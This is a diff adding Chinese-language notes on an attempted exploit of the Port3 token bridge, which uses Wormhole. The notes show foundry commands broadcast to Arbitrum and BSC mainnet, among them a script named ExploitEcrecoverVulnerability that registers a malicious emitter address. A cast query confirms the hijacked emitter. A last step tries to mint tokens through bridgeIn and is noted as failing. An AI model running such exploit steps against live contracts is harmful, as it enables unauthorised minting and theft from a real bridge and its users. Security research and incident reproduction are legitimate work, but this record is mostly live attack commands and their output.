@@ -317,3 +317,116 @@ value                0
 yParity              0
 ```
 
+## 攻击复现尝试
+- 测试命令
+```bash
+root@racknerd-9da1d08:~/home/port3-review/wormhole-study# 
+forge script script/SendMessage.s.sol:SendMessageScript     --rpc-url https://arb1.arbitrum.io/rpc     -vvvv
+```
+- 测试结果
+```bash
+==========================
+
+Chain 42161
+
+Estimated gas price: 0.020000001 gwei
+
+Estimated total gas used for script: 63492
+
+Estimated amount required: 0.000001269840063492 ETH
+
+==========================
+
+=== Transactions that will be broadcast ===
+
+
+Chain 42161
+
+### Transaction 1 ###
+
+accessList           []
+chainId              42161
+gasLimit             63492
+gasPrice             
+input                0x9a2a40b700000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000f00000000000000000000000000000000000000000000000000000000000000660100000000000000000000000000000000000000000000000000038d7ea4c680000000000000000000000000004644bbcfd26a79a79254af30ed8ab80658a73b32001700000000000000000000000000000000bb09009cdcd358d6c5ce6f56611577f10004060000000000000000000000000000000000000000000000000000
+maxFeePerBlobGas     
+maxFeePerGas         
+maxPriorityFeePerGas 
+nonce                0
+to                   0x4644BBcfd26a79A79254aF30ed8Ab80658a73B32
+type                 0
+value                0
+data (decoded): sendMessageToWormhole(bytes,uint32,uint8)(
+  0x0100000000000000000000000000000000000000000000000000038d7ea4c680000000000000000000000000004644bbcfd26a79a79254af30ed8ab80658a73b32001700000000000000000000000000000000bb09009cdcd358d6c5ce6f56611577f1000406,
+  2,
+  15
+)
+```
+- 真正执行
+```bash
+forge script script/SendMessage.s.sol:SendMessageScript \
+  --rpc-url https://arb1.arbitrum.io/rpc \
+  --private-key $PRIVATE_KEY \
+  --broadcast \
+  -vvvv
+```
+- 真正执行的结果
+```bash
+==========================
+
+Chain 42161
+
+Estimated gas price: 0.020000001 gwei
+
+Estimated total gas used for script: 63128
+
+Estimated amount required: 0.000001262560063128 ETH
+
+==========================
+
+##### arbitrum
+✅  [Success] Hash: 0x28c5b61d0c4105376f70fe9cc5baea99bf29f35381835794c070ee539cd7a66f
+Block: 403558215
+Paid: 0.00000048019 ETH (48019 gas * 0.01 gwei)
+
+✅ Sequence #1 on arbitrum | Total Paid: 0.00000048019 ETH (48019 gas * avg 0.01 gwei)
+                                                                                                                                                                                                                           
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
+
+```
+
+
+
+
+### 注册恶意emmitter地址
+
+```bash
+forge script script/ExploitEcrecoverVulnerability.s.sol \
+  --rpc-url https://bsc-dataseed.binance.org \
+  --broadcast \
+  -vvvv
+```
+
+
+查询一下当前Prot3合约注册的emmitter地址
+```bash
+cast call 0xb4357054c3dA8D46eD642383F03139aC7f090343 \
+  "tokenContracts(uint16)(bytes32)" 23 \
+  --rpc-url https://bsc-dataseed.binance.org
+
+0x000000000000000000000000ec470c84050d49e8ab8ecdc653f297823067c1d1
+```
+正确的应该是这个：0x0000000000000000000000004644bbcfd26a79a79254af30ed8ab80658a73b32
+
+
+### 使用bridgeIn增发代币-目前失败了，好像是VAA的问题？
+
+```bash
+forge script script/UseBridgeIn.s.sol \
+  --rpc-url https://bsc-dataseed.binance.org \
+  --broadcast \
+  -vvvv
+```
